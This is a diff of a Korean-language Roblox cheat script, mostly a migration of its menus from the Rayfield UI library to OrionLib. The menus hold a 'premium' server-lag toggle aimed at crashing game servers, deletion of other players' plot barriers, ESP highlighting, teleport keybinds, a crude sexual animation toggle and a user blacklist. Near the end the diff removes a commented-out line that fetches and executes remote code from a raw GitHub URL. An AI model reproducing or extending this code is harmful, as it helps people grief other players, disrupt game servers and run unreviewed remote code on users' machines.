-        cc.TintColor = Color3.fromRGB(240, 220, 245)
-    end
-})
-bdTab:CreateSection("이외")
-bdTab:CreateToggle({
-    Name = "무지개 캐릭터",
-    Callback = function(Value)
-        _G.RainbowCharacterEnabled = Value
-        
-        if Value then
-            local runService = game:GetService("RunService")
-            local players = game:GetService("Players")
-            local localPlayer = players.LocalPlayer
-            local hue = 0
-            
-            task.spawn(function()
-                while _G.RainbowCharacterEnabled do
-                    local deltaTime = runService.Heartbeat:Wait()
-                    hue = (hue + deltaTime * 0.1) % 1
-                    local rainbowColor = Color3.fromHSV(hue, 1, 1)
-                    
-                    local character = localPlayer.Character
-                    if character then
-                        for _, part in ipairs(character:GetChildren()) do
-                            if part:IsA("BasePart") then
-                                part.Color = rainbowColor
-                            elseif part:IsA("Accessory") and part:FindFirstChild("Handle") then
-                                part.Handle.Color = rainbowColor
-                            end
-                        end
-                    end
-                end
-            end)
-        end
-    end
-})
-bdTab:CreateToggle({
-    Name = "초발광 무지개 블롭맨",
-    Callback = function(Value)
-        _G.RainbowBlobmanEnabled = Value
-        
-        if Value then
-            local runService = game:GetService("RunService")
-            local workspace = game:GetService("Workspace")
-            local hue = 0
-            
-            task.spawn(function()
-                while _G.RainbowBlobmanEnabled do
-                    local deltaTime = runService.Heartbeat:Wait()
-                    hue = (hue + deltaTime * 0.1) % 1
-                    local rainbowColor = Color3.fromHSV(hue, 1, 1)
-                    
-                    local blobman = workspace:FindFirstChild("CurrentBlobman", true)
-                    if blobman then
-                        for _, part in ipairs(blobman:GetDescendants()) do
-                            if part:IsA("BasePart") then
-                                part.Color = rainbowColor
-                                part.Material = Enum.Material.Neon
-                            end
-                        end
-                    end
-                end
-            end)
-        end
-    end
-})
-
-keybindTab:CreateSection("줄")
-local antilagDet = keybindTab:CreateInput({
+keybindTab:AddSection("줄")
+local antilagDet = keybindTab:AddInput({
     Name = "줄 감지",
-    CurrentValue = 30,
-    PlaceholderText = "",
-    RemoveTextAfterFocusLost = false,
-    Flag = "linesInputFlag",
+    Default = 30,
+    Placeholder = "",
     Callback = function(Value)
         AntiLagV = Value
     end
@@ -12386,18 +11328,16 @@ game:GetService('Players').LocalPlayer.CharacterAdded:Connect(function()
     vu6 = false
 end)
 
-keybindTab:CreateSection("Mouse")
-keybindTab:CreateKeybind({
+keybindTab:AddSection("Mouse")
+keybindTab:AddKeybind({
     Name = "텔포",
-    CurrentKeybind = "Z",
-    HoldToInteract = false,
-    Flag = "38",
+    Default = "Z",
     Callback = tpF
 })
 
-local Tper = keybindTab:CreateToggle({
+local Tper = keybindTab:AddToggle({
     Name = "3인칭",
-    CurrentValue = false,
+    Default = false,
     Flag = "AutoSitBlobman",
     Callback = function(Value)
         _G.CameraLoopID = (_G.CameraLoopID or 0) + 1
@@ -12449,20 +11389,18 @@ end)
 
 
 
-keybindTab:CreateKeybind({
+keybindTab:AddKeybind({
     Name = "앉기 <font color='rgb(255,0,0)'>[블롭맨]</font>",
-    CurrentKeybind = "X",
-    HoldToInteract = false,
-    Flag = "40",
+    Default = "X",
     Callback = function()
         BlobSit()
     end,
 })
 
-plotTab:CreateSection("집")
-local BarrierNoclip = plotTab:CreateToggle({
+plotTab:AddSection("집")
+local BarrierNoclip = plotTab:AddToggle({
     Name = "집 베리어 삭제",
-    CurrentValue = false,
+    Default = false,
     Flag = "BarrierNoclipToggle",
     Callback = function(Value)
         BarrierCanCollideT = Value
@@ -12471,7 +11409,7 @@ local BarrierNoclip = plotTab:CreateToggle({
 })
 BarrierNoclip:Set(true)
 
-plotTab:CreateButton({
+plotTab:AddButton({
     Name = "집 베리어 완전삭제 | 햄버거",
     Callback = function()
         PlotBarrierDelete()
@@ -12546,7 +11484,7 @@ PBDrun = false
 end
 
 
-keybindTab:CreateSection("ESP")
+keybindTab:AddSection("ESP")
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
 
@@ -12578,7 +11516,7 @@ function PcldViewF()
                 box.LineThickness = 0.005
                 box.SurfaceTransparency = 1
                 box.SurfaceColor3 = Color3.fromRGB(255, 255, 255)
-                box.Color3 = Color3.fromHSV(0, 1, 1) -- 초기 색상 (빨간색)
+                box.Color3 = Color3.fromHSV(0, 1, 1)
                 box.Parent = obj
                 processed[obj] = true
                 redBoxes[obj] = box
@@ -12636,9 +11574,9 @@ end
 
 
 
-local PCLDView = keybindTab:CreateToggle({
+local PCLDView = keybindTab:AddToggle({
     Name = "PCLD 보기",
-    CurrentValue = false,
+    Default = false,
     Flag = "PCLDView",
     Callback = function(Value)
         PcldViewT = Value
@@ -12647,9 +11585,9 @@ local PCLDView = keybindTab:CreateToggle({
 })
 PCLDView:Set(true)
 
-local ViewTool = keybindTab:CreateToggle({
+local ViewTool = keybindTab:AddToggle({
     Name = "표창,쿠나이 보기",
-    CurrentValue = false,
+    Default = false,
     Flag = "5",
     Callback = function(Value)
         ViewToolT = Value
@@ -12661,25 +11599,23 @@ ViewTool:Set(true)
 
 
 
-CreditsTab:CreateLabel("누나   <font color='rgb(255,0,0)'>[onwer]</font>", 96897864871400, Color3.fromRGB(255, 255, 255), true)
-CreditsTab:CreateParagraph({Title = "0110rim", Content = "착함의 경지"})
+CreditsTab:AddLabel("누나   <font color='rgb(255,0,0)'>[onwer]</font>")
+CreditsTab:AddParagraph("0110rim", "착함의 경지")
 
-CreditsTab:CreateLabel("식호   <font color='rgb(0,255,0)'>[good]</font>", 113854105043977, Color3.fromRGB(255, 255, 255), false)
-CreditsTab:CreateParagraph({Title = "매우좋습니다.", Content = "가장좋은방"})
+CreditsTab:AddLabel("식호   <font color='rgb(0,255,0)'>[good]</font>")
+CreditsTab:AddParagraph("매우좋습니다.", "가장좋은방")
 
-CreditsTab:CreateLabel("알파   <font color='rgb(0,255,255)'>[TOP1 ONWER]</font>", 3572491301, Color3.fromRGB(255, 255, 255), false)
-CreditsTab:CreateParagraph({Title = "QRDOOTE1120", Content = "Owner"})
+CreditsTab:AddLabel("알파   <font color='rgb(0,255,255)'>[TOP1 ONWER]</font>")
+CreditsTab:AddParagraph("QRDOOTE1120", "Owner")
 
-CreditsTab:CreateLabel("부계   <font color='rgb(255,0,0)'>[onwer]</font>", 78390276296494, Color3.fromRGB(255, 255, 255), false)
-CreditsTab:CreateParagraph({Title = "AI_AIPACA", Content = "Co-Owner"})
+CreditsTab:AddLabel("부계   <font color='rgb(255,0,0)'>[onwer]</font>")
+CreditsTab:AddParagraph("AI_AIPACA", "Co-Owner")
 
 
--- ================== 랭크 알림 ==================
-Rayfield:Notify({
-    Title = "랭크 알림",
+OrionLib:MakeNotification({
+    Name = "랭크 알림",
     Content = "랭크 배치완료",
-    Duration = 6,
-    Image = 0
+    Time = 6
 })
 
 
@@ -12693,9 +11629,9 @@ Rayfield:Notify({
 
 
 
-DDTab:CreateToggle({
+DDTab:AddToggle({
     Name = "딸치기   <font color='rgb(25,255,0)'>[자위마스터]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "JerkMotionToggle", 
     Callback = function(Value)
         jerkActive = Value
@@ -12737,9 +11673,6 @@ DDTab:CreateToggle({
     end,
 })
 
---local LineLagT = false
---local LineLagV = 50
-
 function LineLagF()
     task.spawn(function()
         while LineLagT do
@@ -12757,10 +11690,10 @@ function LineLagF()
     end)
 end
 
-lagTab:CreateSection("렉")
-lagTab:CreateToggle({
+lagTab:AddSection("렉")
+lagTab:AddToggle({
     Name = "렉(섭폭)    <font color='rgb(255,0,0)'>[라인]</font>     <font color='rgb(0,0,255)'>[프리미엄]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "lagToggleFlag",
     Callback = function(Value)
         LineLagT = Value
@@ -12769,20 +11702,18 @@ lagTab:CreateToggle({
 })
 
 
-lagTab:CreateInput({
+lagTab:AddInput({
     Name = "줄",
-    CurrentValue = 50,
-    PlaceholderText = "Lines",
-    RemoveTextAfterFocusLost = false,
-    Flag = "linesInputFlag",
+    Default = 50,
+    Placeholder = "Lines",
     Callback = function(Value)
         LineLagV = Value
     end
 })
 
 
-BlacklistTab:CreateLabel("kvzwx9")
-BlacklistTab:CreateLabel("K_SH0619")
+BlacklistTab:AddLabel("kvzwx9")
+BlacklistTab:AddLabel("K_SH0619")
 
 local H = game.Players.LocalPlayer.PlayerScripts.CharacterAndBeamMove
 local v = 0
@@ -12800,7 +11731,4 @@ game:GetService("RunService").RenderStepped:Connect(function(W)
     end 
 end)
 
----loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/q1"))()
 Logger()
-
- 
